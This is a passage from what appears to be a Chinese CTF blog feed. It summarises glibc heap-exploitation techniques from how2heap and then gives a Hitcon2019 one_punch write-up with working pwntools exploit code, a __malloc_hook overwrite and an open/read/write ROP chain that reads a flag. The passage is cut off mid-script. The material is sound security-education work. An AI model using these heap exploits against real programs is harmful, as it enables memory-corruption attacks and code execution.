= <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>首先free(p4)，溢出，对使用中的chunk p2的size进行更改，free掉p2，与p4合并，造成重叠。</p><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>覆盖topchun-size为0xffffffff，分配一个能够溢出size_t的evil_size，到目的地址，再分配一次，对其进行修改。</p><h3 id="bctf2016-bcloud"><a href="#bctf2016-bcloud" class="headerlink" title="bctf2016 bcloud"></a>bctf2016 bcloud</h3><p>null byte overflow，strcpy溢出。修改free_got为put_plt，泄露libc base，后修改atoi_got。</p><h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted bin into stack"></a>unsorted bin into stack</h2><p>和house of lore差不多，只不过这里是对于unsorted bin。</p><p>在栈上伪造chunk，修改unsorted bin尾部chunk的size和bk，使其size不符合下一次分配的要求，使其bk指向栈上伪造的chunk，造成下一次分配落到栈上。</p><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>修改unsorted bin中某一chunk的bk指向某位置p，接下来该chunk分配后，<code>p+2*SIZE_ZE</code>处会被覆盖为unsorted bin头结点的地址，也就是unsortedbin地址。</p><p>该攻击通常为进一步攻击做准备，比如覆盖global_max_fast</p><h3 id="0ctf2016-zerostorage"><a href="#0ctf2016-zerostorage" class="headerlink" title="0ctf2016 zerostorage"></a>0ctf2016 zerostorage</h3><p>UAF，realloc with topchunk</p><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk-&gt;fd、bk_nextsize-&gt;fd_nextsize的位置覆盖成堆的地址。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/large_bin2.png" alt="large bin"></p><h3 id="0ctf2018-heapstorm2"><a href="#0ctf2018-heapstorm2" class="headerlink" title="0ctf2018 heapstorm2"></a>0ctf2018 heapstorm2</h3><p>poison null byte, large  bin attack，fake unsorted bin</p><h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><p>泄露堆地址，计算fake size。</p><p>off-by-one覆盖victim-&gt;pre_in_use，修改victim-&gt;prev_size。</p><p>释放victim，与fake chunk合并。</p><p><strong>victim需要与top chunk临近。</strong></p><h3 id="Secon2016-tinypad"><a href="#Secon2016-tinypad" class="headerlink" title="Secon2016 tinypad"></a>Secon2016 tinypad</h3><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>将<code>topchunk-&gt;size</code>缩小并对齐页，malloc一个大于size，就会将old top chunk释放到unsorted bin中。</p><h3 id="Hitcon2016-houseoforange"><a href="#Hitcon2016-houseoforange" class="headerlink" title="Hitcon2016 houseoforange"></a>Hitcon2016 houseoforange</h3><h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h2><p>最主要的思想就是partial overwrite，所以能够在不泄露地址的情况下getshell。</p><p>需要溢出或者UAF</p><p>fast bin attack，partial overwrite fd或者bk指向main_arena的块（从small large unsorted bin中malloc），使其指向<code>malloc_hook-0x23</code></p><p>unsorted bin attack，将bk指向malloc_hook-0x10，使得malloc_hook被写入main_arena地址，从而partial overwrite成为system、onegadget等。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>glibc 2.26~2.28</p><p>没有任何检查，简单的double free</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>修改tcache中已释放块的next(fd)到任意位置，然后进行分配得到</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><p>伪造堆块释放到tcahe。和普通house of spirit不同的是，tcache并没有对后块检查</p><p>prev_inuse没有影响，IS_MMAPPED、NON_MAIN_ARENA有影响</p><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><p>double free</p><p><a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d">commit</a>在<code>struct tcache_entry</code>结构中添加了key变量指向tcache_perthread_struct，所以简单的向tcache中double free两次会被检测到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">+  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">+  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line"> &#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>使用把某个大小tcache填满的方式，将victim同时double free到tcache和unsorted bin，并在victim前面准备了了prev块，以使得size不一样，便于分配。</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>在tcache中布置5个chunk，对应大小的small bin中布置2个chunk。修改倒数第二个small chunk的bk指向target，target-&gt;bk写入一个可写的位置。使用calloc触发，因为calloc调用<code>_int_malloc</code>不会使用tcache进行分配（除了遍历unsorted bin的尾部），只会往tcache中填充。</p><p>可以造成target-&gt;bk-&gt;fd位置写入大数字，并且target成为tcache中第一个，再次malloc就可以获得。</p><p>有点像fastbin reverse into tcache。</p><h3 id="variation"><a href="#variation" class="headerlink" title="variation"></a>variation</h3><p>在tcache中布置6个chunk，对应大小的small bin中布置2个chunk。（可以用unsorted bin切割的方式布置2个small bin）</p><p>修改倒数第二个small chunk的bk，calloc触发，只修改bk-&gt;fd。</p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>可以使用分割unsorted bin的方法，得到对应大小small bin，在不必填满tcache的情况下。</p><h3 id="Hitcon2019-one-punch"><a href="#Hitcon2019-one-punch" class="headerlink" title="Hitcon2019 one punch"></a>Hitcon2019 one punch</h3><h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin reverse into tcache"></a>fastbin reverse into tcache</h2><p>UAF or overflow</p><p>可以达成类似unsorted bin attack的效果，写入一个大的数字到指定地址。（但也可以获得指定地址的chunk。。</p><p>chunk size = 0x50</p><ol><li><p>填满tcache。除了victim外，再往fastbin释放1或6个chunk。如果要写入位置存储的数值为0，则1个就可以。如果数值不为0，则需要6个。结构如下</p><p>fast bin 0x50: p1-&gt;p2-&gt;p3-&gt;p4-&gt;p5-&gt;p6-&gt;victim</p></li><li><p>分配清空tcache</p></li><li><p>修改victim-&gt;fd为”指定地址-0x10”</p><p>fast bin 0x50: p1-&gt;p2-&gt;p3-&gt;p4-&gt;p5-&gt;p6-&gt;victim-&gt;target</p></li><li><p>malloc触发，target-&gt;fd被覆盖为堆地址。tcache中的结构如下</p><p>tcache 0x50: target-&gt;victim-&gt;p6-&gt;p5-&gt;p4-&gt;p3-&gt;p2</p></li><li><p>再malloc一次，获得target</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;first-fit&quot;&gt;&lt;a href=&quot;#first-fit&quot; class=&quot;headerlink&quot; title=&quot;first-fit&quot;&gt;&lt;/a&gt;first-fit&lt;/h2&gt;&lt;p&gt;如果一个chunk可用且足够大，那么就会使用这个chunk。&lt;/p&gt;
&lt;h2 id=&quot;calc-tcache-idx&quot;&gt;&lt;a href=&quot;#calc-tcache-idx&quot; class=&quot;headerlink&quot; title=&quot;calc_tcache_idx&quot;&gt;&lt;/a&gt;calc_tcache_idx&lt;/h2&gt;&lt;p&gt;tcache(thread local caching)&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; TCACHE_MAX_BINS		64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* Only used to pre-fill the tunables.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* When &amp;quot;x&amp;quot; is from chunksize().  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* When &amp;quot;x&amp;quot; is a user-provided size.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; usize2tidx(x) csize2tidx (request2size (x))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* With rounding and alignment, the bins are...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   idx 1   bytes 25..40 or 13..20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   idx 2   bytes 41..56 or 21..28&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   etc.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;tcache拥有和fastbin差不多的结构。默认情况下，64个bin，每个bin最多7个chunk&lt;/p&gt;
&lt;p&gt;64bit: &lt;code&gt;IDX = (CHUNKSIZE - 0x11) / 0x10&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--tcache_stashing_unlink_attack Hitcon2019--one_punch</title>
    <link href="http://hhdx.xyz/2020/07/31/How2heap-tcache-stashing-unlink-attack-Hitcon2019-one-punch/"/>
    <id>http://hhdx.xyz/2020/07/31/How2heap-tcache-stashing-unlink-attack-Hitcon2019-one-punch/</id>
    <published>2020-07-31T13:40:45.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>在tcache中布置5个chunk，对应大小的small bin中布置2个chunk。修改倒数第二个small chunk的bk指向target，target-&gt;bk写入一个可写的位置。使用calloc触发，因为calloc调用<code>_int_malloc</code>不会使用tcache进行分配（除了<code>_int_malloc</code>遍历unsorted bin的尾部），只会往tcache中填充。</p><p>可以造成target-&gt;bk-&gt;fd位置写入大数字，并且target成为tcache中第一个，再次malloc就可以获得。</p><p>有点像fastbin reverse into tcache。</p><h3 id="variation"><a href="#variation" class="headerlink" title="variation"></a>variation</h3><p>在tcache中布置6个chunk，对应大小的small bin中布置2个chunk。（可以用unsorted bin切割的方式布置2个small bin）</p><p>修改倒数第二个small chunk的bk，calloc触发，只在bk-&gt;fd写入大数字。</p><a id="more"></a><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>可以使用分割unsorted bin的方法，得到对应大小small bin，不必事先填满tcache。</p><h2 id="Hitcon2019-one-punch"><a href="#Hitcon2019-one-punch" class="headerlink" title="Hitcon2019 one_punch"></a>Hitcon2019 one_punch</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>main开始处使用全局变量存储了heap_base+0x10的指针。这里实际上指向了tcache的管理结构<code>tcache_perthread_struct</code>，每个arena存在这么一个。在<code>tcache_init</code>函数中使用<code>_int_malloc</code>分配，在2.29中大小为0x280。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">############################</span><br><span class="line">👼     One Punch Man      👼</span><br><span class="line">############################</span><br><span class="line">#   1. debut               #</span><br><span class="line">#   2. rename              #</span><br><span class="line">#   3. show                #</span><br><span class="line">#   4. retire              #</span><br><span class="line">#   5. Exit                #</span><br><span class="line">############################</span><br></pre></td></tr></table></figure><p>debut：读取字符串到栈上，使用calloc分配对应大小的chunk进行存储且存储长度。输入字符串长度必须在0x80到0x400之间</p><p>rename：更改字符串</p><p>show：打印字符串</p><p>retire ：释放空间，但没有将指针置0，存在指针悬空</p><p>同时存在一个后门函数，输入0xC388，可以执行。后门函数判断heap_base+0x30处的单字节是否大于6，大于则继续执行。使用malloc分配0x217，然后读入字符串。没有被释放，这里存在内存泄漏</p><p><strong>calloc</strong></p><p>malloc执行过程：<code>__libc_malloc</code>-&gt;<code>_int_malloc</code></p><p>calloc执行过程：<code>__libc_calloc</code>-&gt;<code>_int_malloc</code></p><p>使用tcache分配即为<code>tcache_get</code>存在于<code>__libc_malloc</code>，而<code>_int_malloc</code>只会使用<code>tcache_put</code>填充tcache。所以得出一般结论，calloc不会使用tcache进行分配。</p><p>（有例外，在<code>_int_malloc</code>中遍历unsorted bin的尾部存在使用tcache分配的行为）</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>利用UAF泄露heap base、libc base。</p><p>利用tcache stashing unlink attack覆写heap_base+0x30的位置。解除后门函数的使用限制。</p><p>对0x220（即<code>malloc(0x217)</code>使用）的tcache使用类似fastbin attack的方式修改<code>__malloc_hook</code>。因为程序使用了seccomp限制了系统调用，所以后续使用rop的方式读出flag。<code>__malloc_hook</code>修改为<code>add rsp, 0x48; ret</code>的gadget地址，将rsp移动到debut函数的buf位置。利用debut中的<code>read(0, buf, 0x400)</code>将一系列rop操作读入到buf里。</p><h3 id="tcache-stashing-unlink-attack-1"><a href="#tcache-stashing-unlink-attack-1" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *$rebase(0x16AB)&quot;)</span></span><br><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">retire(<span class="number">0</span>)</span><br><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">retire(<span class="number">0</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x308</span> + p64(<span class="number">0x101</span>) + p64(heap_base+<span class="number">0x2d20</span>) + p64(heap_base+<span class="number">0x1f</span>))</span><br><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">0xf8</span>, <span class="string">b&quot;\x00&quot;</span>))<span class="comment"># trigger</span></span><br></pre></td></tr></table></figure><p>目标是0x100，首先释放6个进tcache。然后通过切割unsorted bin的方式，使两个0x100的chunk进入small bin。修改倒数第二个small bin的bk，将其指向<code>heap_base+0x30-0x11</code>处。</p><p>如果指向<code>heap_base+0x30-0x10</code>，则会将0x90写入heap_base+0x30处，<code>cmp al, 6</code>看起来是有符号比较，会认为0x90小于0x6。所以偏移一个字节，但有时还是会因为最高位为1而gg。</p><h3 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x217</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x217</span>)</span><br><span class="line">retire(<span class="number">0</span>)</span><br><span class="line">retire(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">1</span>, p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]))</span><br><span class="line">backdoor(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">backdoor(p64(libc_base+<span class="number">0xbdfd1</span>))</span><br></pre></td></tr></table></figure><p>释放得到两个0x220的块进入tcache，修改第一个的tcache_entry-&gt;next到<code>__malloc_hook</code>。两次分配获得hook，修改为<code>add rsp, 0x48; ret</code>的gadget地址。为什么是0x48，调试可以知道。</p><h3 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rop</span></span><br><span class="line">poprdi = libc_base + <span class="number">0x219c0</span></span><br><span class="line">poprsi = libc_base + <span class="number">0x24435</span></span><br><span class="line">poprdx = libc_base + <span class="number">0x1b9a</span></span><br><span class="line">poprax = libc_base + <span class="number">0x37fa8</span></span><br><span class="line">syscall= libc_base + g(<span class="string">&quot;syscall; ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## open</span></span><br><span class="line">rops  = p64(poprdi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">rops += p64(poprsi) + p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(poprdx) + p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(poprax) + p64(<span class="number">2</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">## read</span></span><br><span class="line">rops += p64(poprdi) + p64(<span class="number">3</span>)</span><br><span class="line">rops += p64(poprsi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">rops += p64(poprdx) + p64(<span class="number">20</span>)</span><br><span class="line">rops += p64(poprax) + p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">## write</span></span><br><span class="line">rops += p64(poprdi) + p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(poprsi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">rops += p64(poprdx) + p64(<span class="number">20</span>)</span><br><span class="line">rops += p64(poprax) + p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(syscall)</span><br></pre></td></tr></table></figure><p>依次使用open、read、write系统调用，读取flag。其中<code>syscall; ret</code>这个gadget，ROPgadget这个工具不会进行生成，使用了机器码搜索的方式<code>g = lambda x :next(libc.search(asm(x)))</code>。</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/Hitcon2019%20one_punch/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;info&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./one_punch&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;../glibc_versions/2.29/x64_tcache/lib/libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debut</span>(<span class="params">idx, name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx, 